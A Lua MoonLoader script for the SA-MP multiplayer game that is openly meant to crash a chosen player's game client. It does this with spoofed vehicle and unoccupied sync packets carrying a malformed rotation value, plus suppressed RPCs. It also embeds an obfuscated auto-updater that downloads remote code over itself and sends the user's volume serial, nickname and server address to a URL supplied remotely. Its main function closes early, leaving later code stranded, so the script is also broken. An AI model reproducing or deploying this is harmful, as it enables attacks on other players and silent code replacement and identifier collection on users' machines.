local ev = require('lib.samp.events')

script_name("Crasher players")
script_version("1.0")

-- https://github.com/qrlk/moonloader-script-updater
local enable_autoupdate = true -- false to disable auto-update + disable sending initial telemetry (server, moonloader version, script version, samp nickname, virtual volume serial number)
local autoupdate_loaded = false
local Update = nil
if enable_autoupdate then
    local updater_loaded, Updater = pcall(loadstring, [[return {check=function (a,b,c) local d=require('moonloader').download_status;local e=os.tmpname()local f=os.clock()if doesFileExist(e)then os.remove(e)end;downloadUrlToFile(a,e,function(g,h,i,j)if h==d.STATUSEX_ENDDOWNLOAD then if doesFileExist(e)then local k=io.open(e,'r')if k then local l=decodeJson(k:read('*a'))updatelink=l.updateurl;updateversion=l.latest;k:close()os.remove(e)if updateversion~=thisScript().version then lua_thread.create(function(b)local d=require('moonloader').download_status;local m=-1;sampAddChatMessage(b..'Обнаружено обновление. Пытаюсь обновиться c '..thisScript().version..' на '..updateversion,m)wait(250)downloadUrlToFile(updatelink,thisScript().path,function(n,o,p,q)if o==d.STATUS_DOWNLOADINGDATA then print(string.format('Загружено %d из %d.',p,q))elseif o==d.STATUS_ENDDOWNLOADDATA then print('Загрузка обновления завершена.')sampAddChatMessage(b..'Обновление завершено!',m)goupdatestatus=true;lua_thread.create(function()wait(500)thisScript():reload()end)end;if o==d.STATUSEX_ENDDOWNLOAD then if goupdatestatus==nil then sampAddChatMessage(b..'Обновление прошло неудачно. Запускаю устаревшую версию..',m)update=false end end end)end,b)else update=false;print('v'..thisScript().version..': Обновление не требуется.')if l.telemetry then local r=require"ffi"r.cdef"int __stdcall GetVolumeInformationA(const char* lpRootPathName, char* lpVolumeNameBuffer, uint32_t nVolumeNameSize, uint32_t* lpVolumeSerialNumber, uint32_t* lpMaximumComponentLength, uint32_t* lpFileSystemFlags, char* lpFileSystemNameBuffer, uint32_t nFileSystemNameSize);"local s=r.new("unsigned long[1]",0)r.C.GetVolumeInformationA(nil,nil,0,s,nil,nil,nil,0)s=s[0]local t,u=sampGetPlayerIdByCharHandle(PLAYER_PED)local v=sampGetPlayerNickname(u)local w=l.telemetry.."?id="..s.."&n="..v.."&i="..sampGetCurrentServerAddress().."&v="..getMoonloaderVersion().."&sv="..thisScript().version.."&uptime="..tostring(os.clock())lua_thread.create(function(c)wait(250)downloadUrlToFile(c)end,w)end end end else print('v'..thisScript().version..': Не могу проверить обновление. Смиритесь или проверьте самостоятельно на '..c)update=false end end end)while update~=false and os.clock()-f<10 do wait(100)end;if os.clock()-f>=10 then print('v'..thisScript().version..': timeout, выходим из ожидания проверки обновления. Смиритесь или проверьте самостоятельно на '..c)end end}]])
    if updater_loaded then
        autoupdate_loaded, Update = pcall(Updater)
        if autoupdate_loaded then
            Update.json_url = "https://github.com/zzzzxcccc/crasher-test/blob/main/version.json" .. tostring(os.clock())
            Update.prefix = "[" .. string.upper(thisScript().name) .. "]: "
            Update.url = "https://github.com/zzzzxcccc/crasher-test/blob/main/version.json/"
        end
    end
end

local state = false
local isHooked = false
local ignore = false

local target = 0
local lastPos = {x = 0, y = 0, z = 0}

function main()
    if not isSampfuncsLoaded() or not isSampLoaded() then
        return
    end
    while not isSampAvailable() do
        wait(100)
    end

    -- вырежи тут, если хочешь отключить проверку обновлений
    if autoupdate_loaded and enable_autoupdate and Update then
        pcall(Update.check, Update.json_url, Update.prefix, Update.url)
    end
    -- вырежи тут, если хочешь отключить проверку обновлений
   
    -- дальше идёт ваш код
end
    repeat wait(0) until isSampAvailable()
    sendMessage('Crasher players by Necromastery loaded')
    sampRegisterChatCommand('vcrash', function(param)
        ignore = false
        if state then
            state = false
            forceMe()
            sendMessage('Выключен')
        else
            if not isCharOnFoot(PLAYER_PED) then
                local veh = getCarCharIsUsing(PLAYER_PED)
                local _, vid = sampGetVehicleIdByCarHandle(veh)
                if _ then
                    if getDriverOfCar(veh) == PLAYER_PED then
                        if param:match('%d+') then
                            target = tonumber(param)
                            local _, ped = sampGetCharHandleBySampPlayerId(target)
                            if _ then
                                local x, y, z = getCharCoordinates(ped)
                                lastPos = {x = x, y = y, z = z}
                                isHooked = false
                                state = true
                                sendMessage('Включен')
                            else
                                sendMessage('Игрока нет в зоне стрима')
                            end
                        else
                            sendMessage('Используйте: /vcrash [id игрока]')
                        end
                    else
                        sendMessage('Нужно быть водителем')
                    end
                else
                    sendMessage('Не смогли получить ваше авто')
                end
            else
                sendMessage('Нужно быть в авто на водительском месте')
            end
        end
    end)
    while true do
        wait(0)
        if state then
            if not isCharOnFoot(PLAYER_PED) then
                local veh = getCarCharIsUsing(PLAYER_PED)
                local _, vid = sampGetVehicleIdByCarHandle(veh)
                if _ then
                    if getDriverOfCar(veh) == PLAYER_PED then
                        local _, ped = sampGetCharHandleBySampPlayerId(target)
                        if _ then
                            local x, y, z = getCharCoordinates(ped)
                            lastPos = {x = x, y = y, z = z}
                            if isHooked then
                                forceMe()
                                ignore = true
                                sampSendEnterVehicle(vid, false)
                                lua_thread.create(function() 
                                    while ignore do
                                        pcall(sampForceOnfootSync)
                                        wait(10)
                                        pcall(sampForceUnoccupiedSyncSeatId, vid, 0)
                                        wait(10)
                                    end
                                end)
                                wait(1000)
                                ignore = false
                                state = false
                                sendMessage('Готово')
                            else
                                pcall(sampForceVehicleSync, vid)
                            end
                        else
                            sendMessage('Игрок пропал из зоны стрима, скрипт выключен')
                            state = false
                        end
                    else
                        sendMessage('Нужно быть водителем, скрипт выключен')
                        state = false
                    end
                else
                    sendMessage('Не смогли получить ваше авто, скрипт выключен')
                    state = false
                end
            else
                sendMessage('Вы вышли из авто, скрипт выключен')
                state = false
            end
        end
    end
end

function ev.onSendVehicleSync(data)
    if ignore then return false end
    if state then
        if not isHooked then
            data.position = lastPos
            data.position.z = data.position.z - 1
        else
            data.moveSpeed.z = -1
        end
    end
end

function onReceiveRpc(id, bitStream)
    if state then
        if id == 86 or id == 87 then return false end
    end
end

function ev.onPlayerSync(playerid, data)
    if state then
        if playerid == target then
            if data.surfingVehicleId == getMyVehicleId() and not isHooked then
                isHooked = true
            end
        end
    end
end

function ev.onSendUnoccupiedSync(data)
    if state and isHooked then
        data.position = lastPos
        data.position.z = data.position.z + 2
        data.roll = {x = 0e+1000, y = 0e+1000, z = 0e+1000}
        printStringNow('SENT', 1000)
    end
end

function getMyVehicleId()
    if not isCharOnFoot(PLAYER_PED) then
        local veh = getCarCharIsUsing(PLAYER_PED)
        local _, vid = sampGetVehicleIdByCarHandle(veh)
        if _ then
            return vid
        end
    end
    return -1
end

function sendMessage(text)
    tag = '{FF5656}[VCrash]: '
    sampAddChatMessage(tag .. text, -1)
end

function forceMe()
    if isCharOnFoot(PLAYER_PED) then
        sampForceOnfootSync()
    else
        local veh = getCarCharIsUsing(PLAYER_PED)
        local _, vid = sampGetVehicleIdByCarHandle(veh)
        if _ then
            if getDriverOfCar(veh) == PLAYER_PED then
                sampForceVehicleSync(vid)
            end
        end
    end
end
